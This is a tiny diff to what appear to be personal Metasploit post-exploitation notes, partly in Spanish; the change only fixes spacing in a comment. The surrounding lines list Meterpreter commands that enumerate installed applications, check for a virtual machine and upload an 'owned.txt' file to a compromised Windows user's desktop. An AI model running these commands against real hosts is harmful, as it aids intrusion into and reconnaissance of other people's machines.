@@ -11,7 +11,7 @@ run post/windows/gather/enum_applications
 ## Chek if i am on a VM
 run post/windows/gather/checkvm
 
-##Descargar archivos ##
+## Descargar archivos ##
 #server-->targer
 upload /home/ubuntu/shuriken/owned.txt C:\\Users\\agaga\\Desktop
 #target-server
